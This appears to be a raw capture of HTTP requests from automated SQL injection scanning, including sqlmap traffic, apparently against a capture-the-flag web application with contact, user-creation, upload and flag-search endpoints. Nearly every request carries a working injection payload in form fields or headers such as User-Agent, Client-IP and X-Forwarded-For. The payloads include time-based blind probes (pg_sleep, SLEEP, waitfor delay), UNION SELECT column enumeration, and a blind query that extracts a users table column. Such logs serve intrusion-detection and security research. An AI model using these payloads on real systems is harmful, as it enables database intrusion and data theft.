User-Agent: sqlmap/1.2.7.20#dev (http://sqlmap.org)') AND 5143 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5143=5143) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113)))-- mlBL
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7.20#dev (http://sqlmap.org)'||(SELECT 'Wbpt' FROM DUAL WHERE 7781=7781 AND 5143 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(107)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (5143=5143) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113))))||'
Connection: close

"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 323
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=L2TxsJxb');select%20pg_sleep(21);%20--%20&ContactForm%5bemail%5d=sample%40email.tst&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=nmWXfXcMq3q6efdjGzu957NtDHSufXSF8xUtozLSxd7ICPozLk_hNt0pxVpUa-q4iydGMfgaM82lQBzkWeOB6A%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 319
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1%20waitfor%20delay%20'0:0:8'%20--%20&ContactForm%5bemail%5d=sample%40email.tst&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=Ygzie5-J0ZrkxLft3sBHI25cDAR-3mTWLLhLG-ekeZs0YY81xsqb1oOUhdSRkBB8VhZGQSi5I5567XpcjJU9rQ%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 314
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=-1;select%20pg_sleep(8);%20--%20&ContactForm%5bemail%5d=sample%40email.tst&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=Ygzie5-J0ZrkxLft3sBHI25cDAR-3mTWLLhLG-ekeZs0YY81xsqb1oOUhdSRkBB8VhZGQSi5I5567XpcjJU9rQ%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 315
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=-1);select%20pg_sleep(8);%20--%20&ContactForm%5bemail%5d=sample%40email.tst&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=Ygzie5-J0ZrkxLft3sBHI25cDAR-3mTWLLhLG-ekeZs0YY81xsqb1oOUhdSRkBB8VhZGQSi5I5567XpcjJU9rQ%3d%3d"
"/index.php?r=users%2Ffile HTTP/1.1
Accept-Encoding: identity
Content-Length: 829
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1902429811253813294937509316

-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""_csrf""

ZMYrbBmdqXOH_JcWXTama2dyI1k1qcpxtBhVUZg0gZIcsUMmW_n4RuTO9l0vAvYEMihkIwT6lSH3fD8EqHzCxw==
-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[name]""

111';(SELECT * FROM (SELECT(SLEEP(3-(IF(ORD(MID((SELECT IFNULL(CAST(filepath AS CHAR),0x20) FROM t2.users ORDER BY id LIMIT 0,1),12,1))>104,0,3)))))fdlJ)#
-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[imageFile]""


-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[imageFile]""; filename=""1.png""
Content-Type: image/png

1111

-----------------------------1902429811253813294937509316--"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 324
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=iZ66g5Uh'));select%20pg_sleep(16);%20--%20&ContactForm%5bemail%5d=sample%40email.tst&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=Ygzie5-J0ZrkxLft3sBHI25cDAR-3mTWLLhLG-ekeZs0YY81xsqb1oOUhdSRkBB8VhZGQSi5I5567XpcjJU9rQ%3d%3d"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 300
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%3BSELECT%20BENCHMARK%285000000%2CMD5%280x48514b6f%29%29%20AND%20%283985%3D3985"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 244
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20OR%20SLEEP%285%29%23"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 267
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20RLIKE%20SLEEP%285%29%20AND%20%284514%3D4514"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 299
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 327
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20-"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 391
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'%22%2b(select(0)from(select(sleep(3)))v)%2b%22*/&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=QLQ8jhYO3PbkrY6Zd2RwXfoQTPYJCPMHp71_RAgC8t8W2VHAT02WuoP9vKA4NCcCwloGs19vtE_x6E4DYzO26Q%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 305
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=yL3Zspf7');select%20pg_sleep(6);%20--%20&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=QLQ8jhYO3PbkrY6Zd2RwXfoQTPYJCPMHp71_RAgC8t8W2VHAT02WuoP9vKA4NCcCwloGs19vtE_x6E4DYzO26Q%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 399
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=if(now()%3dsysdate()%2csleep(8)%2c0)/*'XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(8)%2c0))OR%22*/&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=C4Tuo_xWH3FngjZWSODKzXzChtGfKAmO9mLxnetmYMBd6YPtpRVVPQDSBG8HsJ2SRIjMlMlPTsagN8DagFck9g%3d%3d"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 373
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 303
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=1%20waitfor%20delay%20'0:0:12'%20--%20&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=C4Tuo_xWH3FngjZWSODKzXzChtGfKAmO9mLxnetmYMBd6YPtpRVVPQDSBG8HsJ2SRIjMlMlPTsagN8DagFck9g%3d%3d"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 387
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 273
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=-5910%29%20UNION%20ALL%20SELECT%202506%2C2506%2C2506%23"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 308
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=-5265%29%20UNION%20ALL%20SELECT%201763%2C1763%2C1763%2C1763%2C1763%2C1763%2C1763%2C1763%23"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 391
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=(select(0)from(select(sleep(5)))v)/*'%2b(select(0)from(select(sleep(5)))v)%2b'%22%2b(select(0)from(select(sleep(5)))v)%2b%22*/&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=A6Mlzkm0Yugcm1YSCxbfti3kRnWzF59IEtEycNO8-mlVzkiAEPcopHvLZCtERojpFa4MMOVw2ABEhAM3uI2-Xw%3d%3d"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=rAXPmect';%20waitfor%20delay%20'0:0:5'%20--%20&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=A6Mlzkm0Yugcm1YSCxbfti3kRnWzF59IEtEycNO8-mlVzkiAEPcopHvLZCtERojpFa4MMOVw2ABEhAM3uI2-Xw%3d%3d"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 413
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=-8692%29%20UNION%20ALL%20SELECT%206065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%2C6065%23"
"/index.php?r=users%2Fcreate HTTP/1.1
Content-Length: 441
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store
Content-Type: application/x-www-form-urlencoded; charset=utf-8

_csrf=877bc9db66c7ab2a0d0b7f332c0ddf07ea7cb53fabc6bdd1de1a1658d43901c9a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22C4sL_GPZ2_Ao5OZJ6iAhdCyH3gbN0q3u%22%3B%7D&Users%5Busername%5D=ggdI&Users%5Bpassword%5D=-7566%29%20UNION%20ALL%20SELECT%201825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%2C1825%23"
"/index.php?r=site/contact HTTP/1.1
Content-Length: 312
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept: */*

contact-button=&ContactForm%5bbody%5d=1&ContactForm%5bemail%5d=wBis8qYp';%20waitfor%20delay%20'0:0:21'%20--%20&ContactForm%5bname%5d=chtcasmm&ContactForm%5bsubject%5d=1&ContactForm%5bverifyCode%5d=g00dPa%24%24w0rD&_csrf=nmWXfXcMq3q6efdjGzu957NtDHSufXSF8xUtozLSxd7ICPozLk_hNt0pxVpUa-q4iydGMfgaM82lQBzkWeOB6A%3d%3d"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Client-IP: -1));select pg_sleep(9); -- 
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Client-IP: g7jk6o5K');select pg_sleep(9); -- 
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Client-IP: 0SdMlkSQ'));select pg_sleep(9); -- 
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
X-Forwarded-For: -1));select pg_sleep(6); -- 
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/seArch_For_ONe_flag.php?userid=88 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.38#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=88 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.38#dev (http://sqlmap.org)
Connection: close

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
X-Forwarded-X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
X-Forwarded-X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept-Language: if(now()=sysdate(),sleep(3),0)/*'XOR(if(now()=sysdate(),sleep(3),0))OR'""XOR(if(now()=sysdate(),sleep(3),0))OR""*/
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Accept-Language: -1); waitfor delay '0:0:6' -- 
X-Requested-With: XMLHttpRequest
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

"
"/seArch_For_ONe_flag.php?userid=1%0A%7C%7C%0A1%29%29%2F%2A%210AS%20BaKt%2F%2A%210WHERE%202170%3D2170%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL--%20ZVQD HTTP/1.1
